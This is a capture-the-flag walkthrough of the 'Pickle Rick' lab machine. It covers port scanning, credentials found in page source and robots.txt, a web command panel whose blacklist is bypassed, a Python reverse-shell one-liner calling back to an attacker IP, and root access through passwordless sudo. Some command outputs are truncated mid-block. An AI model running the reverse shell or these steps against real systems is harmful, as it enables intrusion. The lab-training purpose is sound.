### Walkthrough

Running an initial Nmap scan against all ports shows both port 22 (SSH) and 80 (HTTP) are open:

```console
$ nmap -p- -T4 10.10.76.19 -oN scans/initial.nmap   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 09:09 GMT
Nmap scan report for 10.10.76.19
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.99 seconds
```

Running a full scan against these ports show Apache version `2.4.18` is running on an Ubuntu sytem:

```console
$ nmap -p 22,80 -A -T4 10.10.76.19 -oN scans/open_ports.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 09:13 GMT

Host is up (0.031s latency).

Navigating to the website shows the following homepage which states Rick has forgotten his password and his three secret ingredients for his pickle-reverse potion:

![Pickle Rick - Homepage](picklerick_homepage.png)

Reviewing the source code reveals the username is `R1ckRul3s`

Checking `/robots.txt` shows the following text:

```
Wubbalubbadubdub
```

Running `gobuster` with a medium-length dictionary list does not reveal any hidden paths:

```console

Navigating to this page shows a simple login form:

![Pickle Rick - Login](picklerick_login_php.png)

Using the username and string from `robots.txt` as the credentials (`R1ckRul3s:Wubbalubbadubdub`) allows us to successfully log in. At which point, we are presented with a command panel, allowing us to interact with the host via built-in commands:

![Pickle Rick - Portal](picklerick_portal.png)

For example, running `ls` returns the directory listing:

![Pickle Rick - ls](picklerick_ls.png)

However, attempting to run `cat` against the files results in the following error:

![Pickle Rick - Command Disabled](picklerick_command_disabled.png)

Fortunately, the `less` command is not denied, allowing us to read the first ingredient:

![Pickle Rick - Less](picklerick_less_ingred1.png)

```
mr. meeseek hair
```

Viewing `clue.txt` indicates we can look through the filesystem for the other ingredient:

![Pickle Rick - Clue](picklerick_clue.png)

First, let's get a shell on the host so that we can navigate through the filesystem easier. We can use a Python one-liner from [PentestMonkey's Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), modifying it with our attacker IP and chosen listen port:

![Pickle Rick - Which Python3](picklerick_which_python3.png)

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This results in a successful callback to our attacker machine:

![Pickle Rick - Callback](picklerick_callback.png)

Stabilising the shell with the following commands:

```console
$ python3 -c "import pty; pty.spawn('/bin/bash')"
$ export TERM=xterm
```

Looking around the filesystem, we identify the `rick` user in `/home`:

![Pickle Rick - Rick User](picklerick_rick_user.png)

Within their `/home` directory, there is a `second ingredients` file which we can read:

![Pickle Rick - Ingredient](picklerick_ingredient2.png)

```
1 jerry tear
```

Now we must escalate our privileges in order to find the 3rd and final ingredient. To do this, we can run `sudo -l` to see if there are any privileges granted to the `www-data` user


![Pickle Rick - Sudo -l](picklerick_sudo_l.png)

From the above, we can see that the user can run any `sudo` command without requiring password authentication. This means we can simply run `sudo su` to switch to the `root` user:

```console
$ sudo su
```

![Pickle Rick - Privesc](picklerick_privesc.png)

Finally, we can read the third ingredient:

![Pickle Rick - Ingredient 3](picklerick_ingredient3.png)

```
fleeb juice
```
